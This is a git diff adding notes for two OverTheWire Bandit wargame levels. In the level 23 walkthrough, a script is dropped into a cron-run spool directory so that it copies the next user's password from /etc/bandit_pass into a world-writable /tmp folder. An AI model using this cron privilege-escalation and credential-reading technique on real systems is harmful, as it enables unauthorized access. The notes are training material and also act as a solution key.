@@ -202,7 +202,7 @@ A program is running automatically at regular intervals from cron, the time-base
 ### problem
 A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
 ### solution
-- similar solution to previous problem
+- similar start to previous problem
 - look in /etc/cron.d/ for config related to level
 - run `ls /etc/cron.d/`
 - run `cat /etc/cron.d/cronjob_bandit23`
@@ -211,3 +211,31 @@ A program is running automatically at regular intervals from cron, the time-base
 - shell script shows location to next password (so next two commands are from that shell script)
 - run a modified line (bandit23 instead of bandit22) in the shell script to find the location: `mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)`
 - cat to find next password: `cat /tmp/$mytarget`
+
+## level 23
+### problem
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+### solution
+- similar start to previous problems
+- look in /etc/cron.d/ for config related to level
+- run `ls /etc/cron.d/`
+- run `cat /etc/cron.d/cronjob_bandit24`
+- cronjob shows shell script is running at `/usr/bin/cronjob_bandit24.sh`
+- run `cat /usr/bin/cronjob_bandit24.sh`
+- shell script shows all scripts are run then deleted in /var/spool/$myname/foo
+- create temp folder to create script and save result: `mkdir /tmp/exploit`
+- run `cd /tmp/exploit`
+- run `vim exploit.sh`
+```bash
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/exploit/password
+```
+- fix permissions: `chmod +x exploit.sh`
+- run `chmod 777 /tmp/exploit`
+- copy script from tmp to cron executed location: `cp exploit.sh /var/spool/bandit24/foo/`
+- in a minute when cron executes, a password file will create in /tmp/exploit with the password to next level
